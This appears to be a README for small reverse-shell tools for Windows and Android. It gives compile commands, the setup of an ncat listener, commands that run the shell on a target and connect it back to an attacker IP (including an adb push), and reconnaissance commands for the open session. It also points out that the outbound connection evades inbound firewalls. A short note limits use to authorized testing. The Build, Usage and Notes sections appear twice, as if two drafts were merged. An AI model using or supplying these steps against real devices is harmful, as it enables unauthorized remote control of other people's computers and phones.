# Reverse Shell (Windows + Android)

Minimal TCP reverse shells for **Windows** and **Android**. The target connects
back to your listener and gives you a shell over the socket.

- `revshell.c` — Windows target, spawns `cmd.exe`.
- `revshell_android.c` — Android target, spawns `/system/bin/sh`.

## How it works

Both tools do the same three steps:

1. Connect outbound to the attacker's `host:port`.
2. Spawn a shell (`cmd.exe` on Windows, `/system/bin/sh` on Android) with its
   stdin/stdout/stderr redirected.
3. Bridge those streams to the socket, so anything you type in the listener goes
   to the shell and its output comes back to you.

Because the connection is **outbound** (victim -> attacker), it usually slips past
inbound firewall rules and NAT without extra configuration.

## Build — Windows

Requires a Windows C compiler. Both MSVC and MinGW-w64 work.

### MinGW-w64

```powershell
x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32
```

### MSVC (Developer Command Prompt)

```powershell
cl revshell.c /Fe:revshell.exe /link ws2_32.lib
```

## Build — Android

Requires the Android NDK. Cross-compile `revshell_android.c` as a static ARM64
binary (no glibc dependency, runs on modern Android devices).

### NDK clang (ARM64)

```bash
# <ndk> = path to your NDK install
$NDK/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android26-clang \
    -static revshell_android.c -o revshell_android
```

Adjust the API level (here `26`) to match your device. For older 32-bit devices:

```bash
$NDK/toolchains/llvm/prebuilt/<host>/bin/armv7a-linux-androideabi21-clang \
    -static revshell_android.c -o revshell_android
```

> The binary needs execute permission on the device (`chmod +x`). It spawns
> `/system/bin/sh`, which exists on every Android build; a rooted device or an
> environment with a writable exec location (e.g. Termux, `/data/local/tmp` via
> `adb`) is typically required to run it.

## Usage

### 1. Start the listener

Pick any netcat-style listener. On the attacker machine:

```powershell
ncat -lvnp 4444
```

### 2. Run the shell on the target

Windows:

```powershell
revshell.exe <attacker-ip> [port]
revshell.exe 192.168.1.10
revshell.exe 192.168.1.10 4444
```

Android (via `adb`):

```bash
adb push revshell_android /data/local/tmp/
adb shell chmod 755 /data/local/tmp/revshell_android
adb shell /data/local/tmp/revshell_android <attacker-ip> 4444
```

Android (in Termux):

```bash
./revshell_android <attacker-ip> 4444
```

If the port is omitted it defaults to `4444`.

### 3. Interact

Windows session (`cmd.exe`):

```
whoami
ipconfig /all
dir C:\
```

Android session (`/system/bin/sh`):

```
id
getprop ro.build.version.release
ls /data/data
```

Use `exit` to close the shell and drop the connection.

## Notes

- **No persistence, no stealth, no auth.** These are bare connectivity tools for
  authorized testing on systems you own or are permitted to test.
- Windows shell runs with the privileges of the account that launched it; the
  Android shell runs as the `uid` of the process that spawned it (often `shell`
  via `adb`, or the app uid in Termux).
- Windows Defender and other AV may flag the compiled Windows binary. For lab
  work, this is expected.
- The processes stay in the foreground. Close the terminal / connection and the
  shell dies.

## Build

Requires a Windows C compiler. Both MSVC and MinGW-w64 work.

### MinGW-w64

```powershell
x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32
```

### MSVC (Developer Command Prompt)

```powershell
cl revshell.c /Fe:revshell.exe /link ws2_32.lib
```

## Usage

### 1. Start the listener

Pick any netcat-style listener. On the attacker machine:

```powershell
# Linux / macOS / Windows (ncat)
ncat -lvnp 4444
```

```powershell
# Windows PowerShell alternative (basic)
# or use: nc -lvnp 4444
```

### 2. Run the shell on the target

```powershell
revshell.exe <attacker-ip> [port]
```

Examples:

```powershell
revshell.exe 192.168.1.10
revshell.exe 192.168.1.10 4444
```

If the port is omitted it defaults to `4444`.

### 3. Interact

Once connected, the listener prompt becomes a live `cmd.exe` session:

```
whoami
ipconfig /all
dir C:\
```

Use `exit` to close the shell and drop the connection.

## Notes

- **No persistence, no stealth, no auth.** This is a bare connectivity tool for
  authorized testing on systems you own or are permitted to test.
- The shell is plain `cmd.exe`; it runs with the privileges of the account that
  launched `revshell.exe`.
- Windows Defender and other AV may flag the compiled binary. For lab work, this
  is expected.
- The process stays in the foreground. If you close the terminal, the shell dies.
